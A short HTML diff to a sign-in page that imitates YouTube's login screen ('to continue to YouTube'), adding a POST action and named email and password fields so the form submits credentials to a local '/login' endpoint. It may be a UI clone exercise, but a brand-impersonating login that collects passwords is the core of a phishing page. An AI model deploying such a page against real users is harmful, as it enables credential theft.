@@ -11,12 +11,12 @@
     <h2>Sign in</h2>
     <p class="subtitle">to continue to YouTube</p>
 
-    <form>
+    <form action="/login" method="POST">
 
       <label>Email or phone</label>
-      <input type="text" placeholder="Enter your email">
+      <input name="email" type="text" placeholder="Enter your email">
 
-      <input type="password" placeholder="Enter your password">
+      <input name="password" type="password" placeholder="Enter your password">
 
       <button class="login-btn">Next</button>
 
